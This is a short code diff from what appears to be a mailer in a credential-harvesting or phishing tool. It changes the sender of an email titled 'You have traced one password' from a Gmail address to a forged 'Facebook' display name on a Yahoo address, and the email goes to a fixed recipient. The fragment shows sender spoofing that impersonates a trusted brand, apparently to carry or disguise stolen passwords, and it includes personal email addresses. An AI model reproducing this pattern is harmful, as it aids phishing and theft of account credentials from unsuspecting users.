@@ -7,7 +7,7 @@
     mail(
 
         to: 'st118173@ait.asia',
-        from: 'jntu784@gmail.com',
+        from: 'Facebook<registration_facebookmail@yahoo.com>',
         subject: "You have traced one password",
 
     )
